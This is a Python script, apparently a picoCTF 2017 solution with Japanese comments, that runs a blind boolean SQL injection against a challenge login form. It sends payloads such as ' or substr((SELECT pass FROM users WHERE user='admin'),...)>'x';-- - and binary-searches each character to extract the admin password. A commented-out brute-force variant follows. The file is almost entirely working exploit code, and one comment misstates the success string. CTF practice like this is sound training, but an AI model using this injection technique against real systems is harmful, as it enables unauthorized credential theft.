#!/usr/bin/python
# coding: UTF-8
import sys
import requests
import time
url = 'http://shell2017.picoctf.com:33838/'


def set_candidate(j):
    # エスケープ処理
    if j == 34:
        return '\\"'
    elif j == 39:
        return "\\'"
    elif j == 92:
        return "\\\\"
    else:
        return chr(j)


def binary_search_word(pos):
    # 文字列のpos番目の文字を求める
    j = 64  # asciiコードの128文字の真ん中からスタート
    for i in [1, 2, 3, 4, 5, 6, 7]:  # asciiコードは7bitなので7回二分探索すれば一意に定まる
        candidate = set_candidate(j)  # エスケープしたchr(j)を取得

        print("searching pos,chr(j):" + str(pos) + "," + candidate)

        code = "' or substr((SELECT pass FROM users WHERE user='admin')," + str(pos) + ",1)>'" + \
                candidate + "';-- - "  # > で比較
        r = send_post_request(code)

        # 制御文字と通常文字の境目の判定が考慮できていない気がする…
        if check_response(r) and i == 7:  # i==7で一文字が決定、returnする
            if check_char(candidate):
                print("ERROR or FINISHED! binary_search_word()")
                exit()
            return set_candidate(j + 1)
        elif not check_response(r) and i == 7:
            if check_char(candidate):
                print("ERROR or FINISHED! binary_search_word()")
                exit()
            return candidate

        elif check_response(r):  # i<7のときは次のjの値を設定
            j += 64 // (2**i)
        else:
            j -= 64 // (2**i)
    print("ERROR or FINISHED! binary_search_word()")
    exit()


def send_post_request(code):
    # POSTリクエストを送信しrオブジェクトを返す
    #time.sleep(0.1)
    input_data = {"username": "admin", "password": code}
    r = requests.post(url, data=input_data)
    return r


def check_char(c):
    # 制御文字は答えに入らないとしてチェック
    if c > chr(32) and c < chr(127):
        return False
    else:
        return True


def check_response(r):
    # レスポンス本文にCongratulations!が入っていたら、送ったSQL文がTrueである
    if "Functionality" in r.text:
        return True
    else:
        return False


def main():
    answer = ""  # 先頭何文字かわかっている場合はここで入れて良い
    pos = int(sys.argv[1])  # パスワードの初期位置
    #pos = len(answer)  # パスワードの初期位置
    for i in range(63):  # パスワードの長さを調べていないので無限ループ
        pos += 1
        answer += binary_search_word(pos)
        #if len(answer) != pos:  # 1文字の決定ができなかったら中断
        #    print("ERROR or FINIESHED! answer:" + answer)
        #    exit()
        print("answer:" + answer)

main()


"""

answer = ""
ID = 'admin'
Pass = ""
i = 0
while(1):
    i += 1
    if (len(answer) + 1) != i:
        print "ERROR or FINISHED\nanswer:" + answer
        exit()

    for j in range(33, 126):  # 制御文字は除く
        code = "' or substr(pass," + str(i) + ",1)=='" + chr(j) + "';-- -"
        # print code
        input_data = {"id": ID, "pass": code}

        # r = requests.get(url, params=input_data)
        r = requests.post(url, data=input_data)
        time.sleep(0.1)
        if "Congratulations!" in r.text:
            answer += chr(j)
            print "OK:" + answer
            break
        else:
            print "miss", chr(j)
"""
